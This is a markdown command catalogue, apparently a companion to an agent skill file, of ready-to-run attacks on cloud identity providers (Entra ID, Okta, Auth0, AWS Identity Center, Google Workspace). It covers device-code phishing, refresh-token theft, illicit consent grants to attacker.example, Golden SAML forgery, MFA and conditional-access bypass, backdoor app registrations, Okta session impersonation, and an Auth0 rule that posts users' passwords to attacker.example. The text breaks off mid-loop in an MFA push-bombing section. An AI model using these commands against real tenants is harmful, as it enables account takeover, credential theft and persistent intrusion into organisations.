# Cloud Identity Provider Attack Payloads / Command Catalogue

> Companion to `SKILL.md`. Every command is reproducible on Kali Linux 2025-2 after the per-tool install steps in §0. Multi-cloud: Azure AD/Entra ID, Okta, Auth0, Ping, AWS IAM Identity Center, Google Workspace.
>
> Placeholder convention: `<tenant>` is the target tenant domain or GUID (e.g. `corp.com` or `11112222-3333-4444-5555-666677778888`), `<upn>` is a user principal name (e.g. `victim@corp.com`), `<api-token>` is an Okta SSWS token, `<aws-role-arn>` is an AWS IAM role ARN. Replace before running.

---

## 0. Environment Setup

```bash
# ─── ROADtools (roadrecon, roadtx, roadlib) ───
python3 -m pip install roadrecon roadtx roadlib
# Verify
roadrecon --version
roadtx --version

# ─── AADInternals (PowerShell) ───
# From PowerShell:
Install-Module -Name AADInternals -Force -AllowClobber
Import-Module AADInternals
# Or one-liner download:
iex(iwr https://raw.githubusercontent.com/Gerenios/AADInternals/master/AADInternals.ps1).Content

# ─── MicroBurst ───
git clone https://github.com/NetSPI/MicroBurst /opt/MicroBurst
# Import in PowerShell: Import-Module /opt/MicroBurst/MicroBurst.psm1

# ─── AzureAD / MSOnline / Az PowerShell ───
# Note: MSOnline is deprecated; AzureAD deprecated; use Microsoft Graph PowerShell
Install-Module Microsoft.Graph -Force
Install-Module Az -Force
# For legacy modules (some tools still depend on them):
Install-Module AzureAD -Force -AllowClobber
Install-Module MSOnline -Force -AllowClobber

# ─── Azure CLI ───
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
az --version
az login --use-device-code

# ─── AzureHound ───
curl -L https://github.com/BloodHoundAD/AzureHound/releases/latest/download/azurehound-linux-arm64 -o /usr/local/bin/azurehound
chmod +x /usr/local/bin/azurehound

# ─── MFASweep ───
git clone https://github.com/dafthack/MFASweep /opt/MFASweep
# Import: Import-Module /opt/MFASweep/MFASweep.ps1

# ─── TokenTactics ───
git clone https://github.com/fireeye/TokenTactics /opt/TokenTactics
cd /opt/TokenTactics
python3 -m pip install -r requirements.txt
# Or use TokenTacticsV2 (fork): github.com/sinK4r/TokenTacticsV2

# ─── GraphRunner ───
git clone https://github.com/dafthack/GraphRunner /opt/GraphRunner
cd /opt/GraphRunner
python3 -m pip install -r requirements.txt

# ─── ScoutSuite ───
pip3 install scoutsuite
scout --version

# ─── Okta tooling ───
pip3 install okta-cli
# Or use Okta's official Python SDK: pip3 install okta
# For Okta API exploration: curl with -H "Authorization: SSWS <token>"

# ─── AWS CLI ───
curl "https://awscli.amazonaws.com/awscli-exe-linux-aarch64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
aws --version

# ─── o365creeper / MailSniper ───
git clone https://github.com/LMGsec/o365creeper /opt/o365creeper
git clone https://github.com/swisskyrepo/MailSniper /opt/MailSniper

# ─── General: jq + curl + openssl + base64 ───
sudo apt install -y jq curl openssl coreutils

# ─── Test tenant (Microsoft 365 Developer Program) ───
# Sign up at https://developer.microsoft.com/microsoft-365-dev-program
# Provides a free E5 tenant for testing — recommended over production
```

---

## 1. Azure AD/Entra ID Tenant Reconnaissance

### 1.1 Unauthenticated tenant discovery

```bash
# Identify tenant GUID + verified/federated domains
Import-Module AADInternals
Get-AADIntTenantDomains -Domain corp.com
Get-AADIntTenantDomains -DomainName corp.com -IncludeVerificationKey
# Returns: Name, VerificationKey (GUID), Authentication (Managed/Federated)

# Get tenant information from the public endpoint
curl -s "https://login.microsoftonline.com/corp.com/.well-known/openid-configuration" | jq
curl -s "https://login.microsoftonline.com/corp.com/v2.0/.well-known/openid-configuration" | jq

# Realm discovery — tells you if a domain is managed (Entra ID) or federated
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=victim@corp.com&xml=1"
# Look for: NameSpaceType = Managed | Federated | Unknown

# Tenant GUID via federation metadata
curl -s "https://login.microsoftonline.com/corp.com/FederationMetadata/2007-06/FederationMetadata.xml" | head

# DNS-based discovery — TXT records often confirm tenant
dig +short TXT corp.com | grep -i 'MS=ms'
dig +short TXT _domainkey.corp.com

# User realm via the userrealm endpoint (returns IdP info)
curl -s "https://login.microsoftonline.com/common/userrealm/victim@corp.com?api-version=2.0" | jq
```

### 1.2 Tenant enumeration via AzureADInternals

```powershell
Import-Module AADInternals

# Get all tenants the user has access to
Get-AADIntTenantInfo

# Extract tenant details for a domain
Get-AADIntTenantDomains -Domain corp.com

# Get anonymous access to user enumeration (timing-based)
Invoke-AADIntUserEnumerationAsOutsider -Domain corp.com -UserName "victim@corp.com"
# Returns: exists/not-exists based on auth response timing

# Get configuration
Get-AADIntSyncEnabled -Domain corp.com    # Whether AD Connect is enabled

# Brute-force the tenant GUID
Get-AADIntTenantGUID -Domain corp.com
```

### 1.3 User enumeration (unauthenticated, timing-based)

```bash
# Timing-based existence check via /common/userrealm
# (Entra ID returns slightly different responses for valid vs invalid users)
# Tools: o365creeper, AADInternals Invoke-AADIntUserEnumerationAsOutsider

git clone https://github.com/LMGsec/o365creeper /opt/o365creeper
cd /opt/o365creeper
python3 o365creeper.py -e emails.txt -o valid.txt

# Or use Credninja (legacy)
# https://github.com/Raikia/Credninja
```

### 1.4 MicroBurst subdomain & information discovery

```powershell
Import-Module /opt/MicroBurst/MicroBurst.psm1

# Enumerate Azure subdomains (storage accounts, web apps, etc.)
Invoke-EnumerateAzureSubDomains -Base corp -OutputFile corp-subs.txt

# Get all information about a tenant
Get-AzureIaaSInfo
Invoke-AzBearerTokenTossing    # Search GitHub for leaked tokens

# Find Azure storage containers configured for public access
Invoke-EnumerateAzureBlobs -Base corp
```

---

## 2. User / Group / Service Principal Enumeration

### 2.1 Microsoft Graph API (modern path)

```bash
# Authenticate (device code for non-interactive)
az login --use-device-code --tenant corp.com

# List users
az rest --method get --url "https://graph.microsoft.com/v1.0/users?\$select=userPrincipalName,displayName,jobTitle,department" \
  --query 'value[].userPrincipalName' -o tsv

# List groups (with membership count)
az rest --method get --url "https://graph.microsoft.com/v1.0/groups?\$select=displayName,description,membershipRule" \
  --query 'value[].displayName' -o tsv

# List service principals (apps integrated with the tenant)
az rest --method get --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=displayName,appId,appRoles" \
  --query 'value[].[displayName,appId]' -o tsv

# List applications (registered in this tenant)
az rest --method get --url "https://graph.microsoft.com/v1.0/applications?\$select=displayName,appId,requiredResourceAccess"

# List conditional access policies
az rest --method get --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies"

# List directory roles + assignments
az rest --method get --url "https://graph.microsoft.com/v1.0/directoryRoles"
az rest --method get --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$expand=principal"
```

### 2.2 AzureAD/MSOnline PowerShell (legacy but common)

```powershell
Connect-AzureAD -TenantId "11112222-3333-4444-5555-666677778888"
Connect-MsolService

# All users with attributes
Get-AzureADUser -All $true | Select-Object UserPrincipalName, DisplayName, JobTitle, Department, AccountEnabled

# All groups + membership
Get-AzureADGroup -All $true | ForEach-Object {
  $members = Get-AzureADGroupMember -ObjectId $_.ObjectId -All $true
  [PSCustomObject]@{ Group = $_.DisplayName; Members = ($members.UserPrincipalName -join ', ') }
}

# Service principals with their app roles (permissions)
Get-AzureADServicePrincipal -All $true | Where-Object { $_.AppRoles.Count -gt 0 } | Select-Object DisplayName, AppId

# Privileged users (Global Admins, etc.)
$ga = Get-AzureADDirectoryRole | Where-Object { $_.DisplayName -eq 'Global Administrator' }
Get-AzureADDirectoryRoleMember -ObjectId $ga.ObjectId | Get-AzureADUser

# Directory role assignments (who has what role)
Get-AzureADMSRoleAssignment -All $true | ForEach-Object {
  $role = Get-AzureADMSRoleDefinition -Id $_.RoleDefinitionId
  $user = Get-AzureADObjectByObjectId -ObjectIds $_.PrincipalId
  [PSCustomObject]@{ Role = $role.DisplayName; Principal = $user.UserPrincipalName }
}
```

### 2.3 ROADtools comprehensive dump

```bash
# Authenticate (interactive browser or device code)
python roadrecon auth --tenant corp.com
# Or device code (for phishing):
python roadrecon auth --device-code --tenant corp.com

# Dump everything to SQLite DB
python roadrecon gather --roadrecon-auth-file .roadtools_auth

# Launch the GUI viewer
python roadrecon gui --database roadrecon.db
# Browse: Users, Groups, ServicePrincipals, Applications, ConditionalAccess, DirectoryRoles, OAuth2PermissionGrants
```

### 2.4 AzureHound for graph attack paths

```bash
# Need an access token (from roadrecon or az login)
JWT=$(az account get-access-token --resource-type ms-graph --query accessToken -o tsv)

# Collect data for BloodHound
azurehound -j "$JWT" list users
azurehound -j "$JWT" list groups
azurehound -j "$JWT" list serviceprincipals
azurehound -j "$JWT" list appowners
azurehound -j "$JWT" list directoryroles
azurehound -j "$JWT" list conditionalaccesspolicies

# Pipe all to JSON for BloodHound ingest
azurehound -j "$JWT" list -o bloodhound-data.json
# Then upload to BloodHound, run pre-built Azure queries: "Shortest Path to Global Admin", etc.
```

---

## 3. OAuth 2.0 Token Acquisition

### 3.1 Device code flow (primary phishing vector)

```bash
# Attacker initiates the flow on behalf of the victim's tenant
python roadrecon auth --device-code --tenant corp.com
# Output: To sign in, use a web browser to open the page https://microsoft.com/devicelogin
#         and enter the code ABCDE1234 to authenticate.

# TokenTactics targets specific Microsoft apps via device code
cd /opt/TokenTactics
python tokenTactics.py get-token --client microsoftgraph --tenant corp.com
# Other --client options: outlook, azure, office, teams, msteams, graph, dax, dynamicscrm, aadrm

# Decode the resulting access token
echo $ACCESS_TOKEN | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq .
# Inspect: aud (audience), scp (scopes), appid, oid (user GUID), tid (tenant), iat, exp
```

### 3.2 Primary Refresh Token (PRT) theft

```powershell
# Requires foothold on a Windows endpoint joined to Entra ID
# AADInternals can extract the PRT from lsass / cloudAP

Import-Module AADInternals
Get-AADIntUserPRTKey    # Get the PRT key (if user is admin on the box)

# Extract PRT from the local device
$prt = Get-AADIntLocalADConnect
Get-AADIntPRT -PRTFileName "C:\path\to\PRT.json"

# Or use roadtx to extract & use PRT from a compromised Windows endpoint
roadtx.py prt --prt <prt-base64> --session-key <key>
# Then use the PRT to acquire tokens for any app
roadtx.py gettokens --prt <prt> --session-key <key>
```

### 3.3 Illicit consent grant (app registration abuse)

```bash
# Step 1: Attacker registers an app in their tenant
# Redirect URI: https://attacker.example/callback
# Scopes: Mail.Read, User.Read, offline_access

# Step 2: Construct the admin consent URL
ADMIN_CONSENT_URL="https://login.microsoftonline.com/organizations/v2.0/adminconsent"
CLIENT_ID="11112222-3333-4444-5555-666677778888"  # attacker app
REDIRECT_URI="https://attacker.example/callback"
SCOPES="https://graph.microsoft.com/Mail.Read offline_access"

CONSENT_URL="${ADMIN_CONSENT_URL}?client_id=${CLIENT_ID}&scope=${SCOPES}&redirect_uri=${REDIRECT_URI}"
echo "Send victim to: $CONSENT_URL"

# Step 3: Victim consents → attacker receives authorization code at redirect_uri
# Code: M.C5_BAY.2.U.xxxxx

# Step 4: Exchange code for tokens
curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=$CLIENT_ID" \
  -d "scope=$SCOPES" \
  -d "code=$CODE" \
  -d "redirect_uri=$REDIRECT_URI" \
  -d "grant_type=authorization_code" \
  -d "client_secret=$CLIENT_SECRET"

# Step 5: Use access token
curl -H "Authorization: Bearer $ACCESS_TOKEN" https://graph.microsoft.com/v1.0/me/messages
```

### 3.4 Refresh token replay and exchange

```bash
# Decode the refresh token (in the rt_ format from Microsoft identity platform)
echo $REFRESH_TOKEN | head -c 50

# Exchange refresh token for new access token (different audience!)
curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=1950a258-227b-4e31-a9cf-717495945fc2" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "scope=https://graph.microsoft.com/.default"
# client_id 1950a258-... is the Microsoft Graph PowerShell app — wide scope

# The new access token has whatever scopes the original refresh token allowed
# A single refresh token + offline_access can be replayed across many Microsoft apps
```

### 3.5 TokenTactics for app-specific phishing

```bash
cd /opt/TokenTactics

# Generate device code for each high-value app
python tokenTactics.py get-token --client microsoftgraph --tenant corp.com
python tokenTactics.py get-token --client outlook --tenant corp.com
python tokenTactics.py get-token --client azure --tenant corp.com
python tokenTactics.py get-token --client teams --tenant corp.com
python tokenTactics.py get-token --client office --tenant corp.com
python tokenTactics.py get-token --client aadrm --tenant corp.com    # Azure Information Protection
python tokenTactics.py get-token --client dax --tenant corp.com      # Dynamics

# Each token targets that app's audience — TokensOutlook tokens bypass MFA on Outlook
# because the device code flow trusts MFA was satisfied at the user's authenticator
```

---

## 4. OIDC Redirect URI Abuse

### 4.1 Open redirect chains

```bash
# Many apps register permissive redirect URIs that allow an open redirect
# Inspect a target app's redirect URIs (via Graph if you have rights)
az rest --method get --url "https://graph.microsoft.com/v1.0/applications/<app-id>" \
  --query 'web.redirectUris'
az rest --method get --url "https://graph.microsoft.com/v1.0/applications/<app-id>" \
  --query 'spa.redirectUris'

# A redirect URI like https://app.corp.com/auth/callback?next= allows redirect to attacker
# Construct: https://login.microsoftonline.com/<tenant>/oauth2/v2.0/authorize
#   ?client_id=<vulnerable-app>
#   &response_type=code
#   &redirect_uri=https://app.corp.com/auth/callback
#   &state=<attacker-controlled>
#   &scope=openid
# If the callback uses `state` for redirect, attacker gets the auth code
```

### 4.2 State confusion / PKCE bypass

```bash
# Replay a state value: capture an auth flow's `state`, replay it later
# Some apps don't bind state to a session — replayable

# PKCE bypass: if the app doesn't enforce PKCE (S256), an attacker who intercepts
# the auth code can complete the flow themselves. Look for missing `code_challenge`.

# Test: request authorization without code_challenge — does the IdP accept it?
curl "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/authorize?client_id=<app>&response_type=code&redirect_uri=<uri>&scope=openid&state=test"
# If redirect happens without code_challenge_required error, PKCE is not enforced
```

---

## 5. SAML Response Forgery

### 5.1 SAML signature wrapping

```bash
# When a SAML-relying app verifies the signature at one location in the XML
# but uses assertions from another location, signature wrapping is possible.
# Tools: SAML Raider (Burp Suite extension), SAMLExtractor, WS-Attacker

# 1. Capture a valid SAML response (via SP-initiated flow)
# 2. In Burp with SAML Raider, modify the response to wrap a new assertion
#    inside a signed wrapper that the app trusts but doesn't use

# Manual signature wrapping payload:
<SAMLResponse>
  <SignedWrapper>
    <OriginalAssertion ID="assertion1">  <!-- the signed part -->
      ...
    </OriginalAssertion>
  </SignedWrapper>
  <EvilAssertion>  <!-- what the app actually reads -->
    <Subject>victim@corp.com</Subject>
    <Attribute Name="role">admin</Attribute>
  </EvilAssertion>
  <Signature>
    <SignedInfo>
      <Reference URI="#assertion1"/>  <!-- signs the wrapper, app uses evil -->
    </SignedInfo>
  </Signature>
</SAMLResponse>
```

### 5.2 Golden SAML via AD FS token-signing certificate

```powershell
# Prerequisites: AD FS TokenSigning cert (extract via DA + DKM, or HSM bypass)
# Reference: CyberArk / FireEye research on Golden SAML (SolarWinds/SUNBURST)

Import-Module AADInternals

# Load the AD FS signing certificate
$cert = Import-PfxCertificate -FilePath TokenSigning.pfx -Password (ConvertTo-SecureString 'pfxpassword' -AsPlain -Force)

# Forge a SAML assertion as the victim user
$token = New-AADIntSAMLToken -ImmutableId 'victim@corp.com' `
  -Issuer 'http://adfs.corp.com/adfs/services/trust' `
  -Certificate $cert `
  -Audience 'urn:federation:MicrosoftOnline' `
  -Expiry (Get-Date).AddHours(2) `
  -MFA -IncludeAuthenticationMethod

# Use the SAML assertion to authenticate to Entra ID
Open-AADIntOffice365Portal -SAMLToken $token
# Result: Bearer token for Microsoft Graph — bypasses Entra ID MFA because the assertion
# contains an AuthenticationMethod statement claiming MFA was satisfied at AD FS.
```

### 5.3 Extracting the AD FS token-signing certificate

```powershell
# Method A: AD FS service account has access; DA on the AD FS server
# Dump from the AD FS configuration DB or DKM container

# Method B: ADFS service running as gMSA — extract from the service
# On the AD FS server (as admin):
Import-Module AADInternals
Export-AADIntADFSConfiguration -ServerName localhost

# Method C: Extract from the DKM container in AD (requires DA on-prem)
Get-AADIntADFSKeys -Server corp-dc01
# Returns the encryption keys + encrypted signing cert material
# Decrypt with: https://github.com/mandiant/ADFSDump-LL

# Method D: VSA (Virtual Smart Card) or LSASS dump on AD FS server
# procdump -ma lsass.exe; pypykatz offline parse
```

### 5.4 Forge SAML for AWS IAM Identity Center

```bash
# AWS IC trusts a SAML IdP (Entra ID, Okta, custom)
# If you have the IdP's signing key, forge SAML for AWS

# Use python3-saml or OneLogin's Python toolkit to sign XML
# Assertion must contain:
#   - Role: arn:aws:iam::<account>:saml-provider/<IdPName>
#   - Role: arn:aws:iam::<account>:role/<RoleName>
#   - Subject: victim
#   - Audience: https://signin.aws.amazon.com/saml
#   - Issuer: <IdP's issuer URI>

# Use the forged assertion to assume role
aws sts assume-role-with-saml \
  --role-arn "arn:aws:iam::111122223333:role/MyRole" \
  --principal-arn "arn:aws:iam::111122223333:saml-provider/EntraId" \
  --saml-assertion "$(base64 -w0 forged_assertion.xml)"
```

---

## 6. Conditional Access Bypass

### 6.1 MFASweep — test legacy endpoints

```powershell
Import-Module /opt/MFASweep/MFASweep.ps1

# Test all Microsoft services for MFA enforcement
Invoke-MFASweep -Username "victim@corp.com" -Password "P@ssw0rd"

# Output per service:
# Microsoft Graph          - MFA Required
# Exchange Web Services    - MFA NOT Required (Basic Auth accepted)
# IMAP                     - MFA NOT Required
# POP3                     - MFA NOT Required
# Exchange ActiveSync      - MFA NOT Required
# If any service says NOT Required, you can auth without MFA via that protocol
```

### 6.2 Legacy authentication

```bash
# IMAP against Exchange Online (if legacy auth is enabled in tenant)
# Server: outlook.office365.com:993
# Use any IMAP client (openssl s_client + IMAP commands, or swaks)
swaks --to victim@corp.com --server outlook.office365.com:993 \
  --auth LOGIN --auth-user victim@corp.com --auth-password 'P@ssw0rd' \
  -tls --port 993

# SMTP-AUTH (if enabled)
swaks --to victim@corp.com --from attacker@example.com \
  --server smtp.office365.com:587 --auth LOGIN --auth-user victim@corp.com \
  --auth-password 'P@ssw0rd' -tls

# Exchange ActiveSync (EAS) — bypasses MFA in legacy tenants
curl -X POST "https://outlook.office365.com/Microsoft-Server-ActiveSync" \
  -u "victim@corp.com:P@ssw0rd" \
  -H "MS-ASProtocolVersion: 14.0"

# Exchange Web Services (EWS) — also legacy
curl -X POST "https://outlook.office365.com/EWS/Exchange.asmx" \
  -u "victim@corp.com:P@ssw0rd" \
  -H "Content-Type: text/xml" -d @ews_request.xml
```

### 6.3 Excluded apps

```bash
# Find conditional access policies and check excluded apps
az rest --method get --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
  | jq '.value[] | {displayName, state, conditions: .conditions.applications, grantControls}'
# Look for "excludeApplications" — these bypass CA entirely

# If Outlook Web App (00000002-0000-0ff1-ce00-000000000000) is excluded,
# auth flows for OWA bypass MFA
```

### 6.4 Location spoofing

```bash
# Apple iCloud Private Relay — exit IPs in your region, but Egress through Apple
# Some tenants whitelist US IPs and consider Apple's exit as US — bypasses geo-CA

# Residential proxies — Bright Data, Oxylabs — appear as a residential US/EU IP
# Configure curl/az cli with the proxy
export HTTPS_PROXY="http://user:pass@proxy.brightdata.com:22225"
az login --use-device-code

# Foothold in trusted country — pivot through a compromised host in the target region
ssh -D 1080 user@compromised-us-host.corp.example
# All traffic egresses from US host

# Tor — usually detected and blocked, but worth testing
torsocks curl -s https://login.microsoftonline.com/common/userrealm/victim@corp.com
```

### 6.5 Device-state spoofing

```bash
# Entra ID Device Code + Intune — devices must be "compliant"
# Check if Intune enrollment can be spoofed

# AADInternals: register a fake device
Import-Module AADInternals
Add-AADIntDevice -DeviceName "FAKE-LAPTOP" -OS "Windows 11"
# Returns device ID + certificate — use it to claim device-based CA bypass

# Device auth with PRT (if you have one) — already covered in §3.2
```

---

## 7. Federation Compromise (AD FS, Ping, Okta)

### 7.1 AD FS DKM key extraction

```powershell
# DKM (Distributed Key Manager) is the AD container holding AD FS encryption keys
# Requires Domain Admin on-prem
Import-Module AADInternals
Get-AADIntADFSKeys -Server "corp-dc01"
# Output: encrypted blobs of the AD FS config + signing cert

# Decrypt with ADFSDump-LL (Mandiant)
# https://github.com/mandiant/ADFSDump-LL
ADFSDump-LL.exe
# Dumps: Service Communication cert, Token Decrypt cert, Token Signing cert
```

### 7.2 Ping Federation compromise

```bash
# Ping Federation stores keys in:
# - <pf-install>/pingfederate/server/default/data/adapters-pkcs12.p12
# - Or HSM (typical for production)

# If you have SSH access to a Ping server:
ssh admin@ping.corp.com
sudo find /opt -name '*.p12' -o -name 'pingfederate*' | head
sudo cat /opt/pingfederate/conf/system.properties | grep -i key

# Extract the partner signing cert and forge SAML as if from Ping
```

### 7.3 Okta federation trust abuse

```bash
# Okta federated with Entra ID — Okta trusts Entra ID's SAML
# Compromise Entra ID → forge SAML for Okta → SSO into Okta apps

# Steps:
# 1. Forge SAML assertion with audience = Okta's ACS URL
# 2. POST the SAMLResponse to Okta's ACS endpoint
# 3. Receive a Okta session cookie

curl -X POST "https://corp.okta.com/sso/saml" \
  -d "SAMLResponse=$(base64 -w0 forged.xml)" \
  -c okta-cookies.txt -L
```

---

## 8. App Registration Abuse

### 8.1 Enumerate over-privileged service principals

```bash
# Service principals with high-privilege app roles
az rest --method get --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=displayName,appId,appRoles,oauth2PermissionScopes,requiredResourceAccess"

# Cross-reference with role assignments
az rest --method get --url "https://graph.microsoft.com/v1.0/servicePrincipals/<id>/appRoleAssignedTo"

# Look for:
# - appRoleAssignment.ReadWrite.All — can grant any app any role
# - Application.ReadWrite.All — can create/modify apps
# - RoleManagement.ReadWrite.Directory — can assign directory roles
# - Mail.ReadWrite — read/write all mailboxes
# - Sites.FullControl.All — full SharePoint control
```

### 8.2 Create a backdoor app registration

```bash
# Requires Application Administrator or Global Admin

# 1. Register the app
az ad app create \
  --display-name "Contoso-Backup-Sync" \
  --is-fallback-public-client false \
  --required-resource-accesses '[
    {"resourceAppId":"00000003-0000-0000-c000-000000000000",
     "resourceAccess":[
       {"id":"e1fe6dd8-ba31-4d61-89e7-88639da4683d","type":"Scope"},
       {"id":"024d486e-b451-40bb-833d-3e28d5d60bb0","type":"Scope"},
       {"id":"df021288-bdef-4463-88db-98f22de89214","type":"Role"}
     ]}
  ]'
# 00000003-... = Microsoft Graph
# e1fe6dd8-... = User.Read
# 024d486e-... = Mail.Read
# df021288-... = Application.ReadWrite.All (Role = app-only)

# 2. Create service principal
az ad sp create --id <new-app-id>

# 3. Grant admin consent
az ad app permission admin-consent --id <new-app-id>

# 4. Add a client secret
az ad app credential reset --id <new-app-id> --append

# 5. Use the app via client credentials flow
curl -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -d "client_id=<app-id>" \
  -d "client_secret=<secret>" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials"
```

### 8.3 App Owner escalation

```bash
# An app owner can add new secrets to the app
# If an attacker owns an app that has high-priv permissions → they have the perms
# Enumerate app owners
az rest --method get --url "https://graph.microsoft.com/v1.0/applications/<id>/owners"

# As an app owner, add a secret and use the app
az ad app credential reset --id <app-id> --append
```

---

## 9. AWS IAM Identity Center Attacks

### 9.1 Enumerate IC users and permission sets

```bash
# Need an IC access token or admin credentials
aws sso-admin list-instances
# Returns: InstanceArn

aws sso-admin list-permission-sets --instance-arn <arn>
aws sso-admin list-account-assignments --instance-arn <arn> --account-id <id>
aws identitystore list-users --identity-store-id <id>
```

### 9.2 Forge SAML and assume role

```bash
# If you have the IdP's signing key (e.g., from Entra ID / Okta compromise)
# See §5.4 for forging the SAML assertion

# Assume role with the forged assertion
aws sts assume-role-with-saml \
  --role-arn "arn:aws:iam::111122223333:role/MyRole" \
  --principal-arn "arn:aws:iam::111122223333:saml-provider/EntraId" \
  --saml-assertion "$(base64 -w0 forged.xml)" \
  --duration-seconds 3600

# Use the resulting AWS creds
export AWS_ACCESS_KEY_ID=AKIAIOSF...
export AWS_SECRET_ACCESS_KEY=wJalrXUt...
export AWS_SESSION_TOKEN=FwoGZX...
aws sts get-caller-identity
aws s3 ls
```

### 9.3 Permission set abuse

```bash
# A permission set defines IAM permissions in target accounts
# If you can modify a permission set, you can escalate in those accounts
aws sso-admin put-inline-policy-to-permission-set \
  --instance-arn <arn> \
  --permission-set-arn <ps-arn> \
  --inline-policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

---

## 10. Okta API Attacks

### 10.1 API token theft

```bash
# Okta API tokens are SSWS (Static Wrapped Secret) tokens
# Common leak locations:
# - .okta-aws config files
# - Environment variables in CI/CD
# - Terraform .tfvars
# - Application source code

# Search GitHub for leaked tokens
# Use trufflehog or gitleaks
trufflehog github --org=corp
gitleaks detect --source . --report-path leaks.json
```

### 10.2 Okta API enumeration

```bash
export OKTA_API_TOKEN="SSWS 00xxxxxxxxxxxxxxxxxxxxxx"

# List users
curl -s -H "Authorization: $OKTA_API_TOKEN" "https://corp.okta.com/api/v1/users?limit=200" | jq '.[].profile.login'

# List apps
curl -s -H "Authorization: $OKTA_API_TOKEN" "https://corp.okta.com/api/v1/apps" | jq '.[].label'

# List groups
curl -s -H "Authorization: $OKTA_API_TOKEN" "https://corp.okta.com/api/v1/groups" | jq '.[].profile.name'

# Get user by login
curl -s -H "Authorization: $OKTA_API_TOKEN" "https://corp.okta.com/api/v1/users?q=victim@corp.com" | jq

# Get admin users
curl -s -H "Authorization: $OKTA_API_TOKEN" "https://corp.okta.com/api/v1/groups?q=Admin" | jq
```

### 10.3 Okta user impersonation

```bash
# Create a session for any user (requires admin API token)
curl -s -X POST "https://corp.okta.com/api/v1/sessions?additionalFields=cookieToken" \
  -H "Authorization: $OKTA_API_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"userId": "00u1xxxxxxxxxxxx"}'
# Returns a session cookie token — use it as `sid` cookie at corp.okta.com

# Full SSO impersonation: browse Okta as the victim user
curl -s -H "Cookie: sid=$SESSION_TOKEN" "https://corp.okta.com/end-user/settings"
```

### 10.4 OAuth app abuse in Okta

```bash
# Get OAuth tokens issued by Okta
curl -s -H "Authorization: $OKTA_API_TOKEN" "https://corp.okta.com/api/v1/apps/<app-id>/tokens"
# Returns access tokens issued to that app

# Revoke/abuse as needed
curl -s -X DELETE -H "Authorization: $OKTA_API_TOKEN" \
  "https://corp.okta.com/api/v1/apps/<app-id>/tokens/<tokenId>"
```

---

## 11. Auth0 / Ping Attacks

### 11.1 Auth0 tenant enumeration

```bash
# Auth0 tenants: <tenant>.auth0.com or custom domain
# User enumeration via signup (timing differences)
curl -X POST "https://corp.auth0.com/dbconnections/signup" \
  -H "Content-Type: application/json" \
  -d '{"client_id":"<app-client-id>","email":"existing@corp.com","password":"Test1234!","connection":"Username-Password-Authentication"}'
# A 400 with "user exists" reveals the user exists

# Brute-force rate limits per IP — spray from many IPs
```

### 11.2 Auth0 rule / hook abuse

```bash
# Auth0 rules run as JS during auth flow
# A compromised Auth0 admin can inject malicious rules

# Example: capture all user passwords
function (user, context, callback) {
  // Log credentials to attacker-controlled endpoint
  fetch('https://attacker.example/capture', {
    method: 'POST',
    body: JSON.stringify({ email: user.email, password: user.password })
  });
  callback(null, user, context);
}
```

---

## 12. Google Workspace Attacks

### 12.1 OAuth app abuse

```bash
# Many Google Workspace users consent to third-party OAuth apps
# An attacker's app with gmail.readonly or drive.readonly can read all emails/files

# Construct OAuth URL
OAUTH_URL="https://accounts.google.com/o/oauth2/v2/auth"
CLIENT_ID="<attacker-app>.apps.googleusercontent.com"
REDIRECT_URI="https://attacker.example/callback"
SCOPES="https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/drive.readonly"

CONSENT_URL="${OAUTH_URL}?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&response_type=code&scope=${SCOPES}&access_type=offline&prompt=consent"
# Phish victim → consent → access + refresh tokens
```

### 12.2 Service account + Domain-Wide Delegation (DWD)

```bash
# DWD allows a service account to impersonate any user in the workspace
# Requires workspace admin to grant scopes to the SA

# Create JWT for OAuth
JWT_HEADER='{"alg":"RS256","typ":"JWT"}'
JWT_CLAIMS='{"iss":"<sa-email>","scope":"https://www.googleapis.com/auth/gmail.readonly","aud":"https://oauth2.googleapis.com/token","exp":'$(($(date +%s)+3600))',"iat":'$(date +%s)'}'

# Sign JWT with SA private key
echo -n "$(echo -n "$JWT_HEADER" | base64 | tr -d '=' | tr '/+' '_-').$(echo -n "$JWT_CLAIMS" | base64 | tr -d '=' | tr '/+' '_-')" > jwt_body
openssl dgst -sha256 -sign sa-key.pem jwt_body | base64 | tr -d '=' | tr '/+' '_-' > jwt_sig
JWT=$(cat jwt_body).$(cat jwt_sig)

# Exchange JWT for access token (impersonating any user)
curl -X POST "https://oauth2.googleapis.com/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
  -d "assertion=$JWT"

# Use access token to read any user's mail
curl -H "Authorization: Bearer $ACCESS_TOKEN" "https://gmail.googleapis.com/gmail/v1/users/victim@corp.com/messages"
```

### 12.3 Admin SDK API enumeration

```bash
# Requires admin credentials or stolen admin OAuth token
curl -H "Authorization: Bearer $ACCESS_TOKEN" "https://admin.googleapis.com/admin/directory/v1/users?domain=corp.com"
curl -H "Authorization: Bearer $ACCESS_TOKEN" "https://admin.googleapis.com/admin/directory/v1/groups?domain=corp.com"
curl -H "Authorization: Bearer $ACCESS_TOKEN" "https://admin.googleapis.com/admin/directory/v1/users/victim@corp.com/tokens"
# Lists all OAuth tokens issued for the user
```

---

## 13. MFA Bypass Techniques

### 13.1 MFA fatigue / push-bombing

```bash
# Send repeated MFA push prompts to victim's device
# Okta: trigger authn repeatedly — each pushes a notification
for i in $(seq 1 20); do
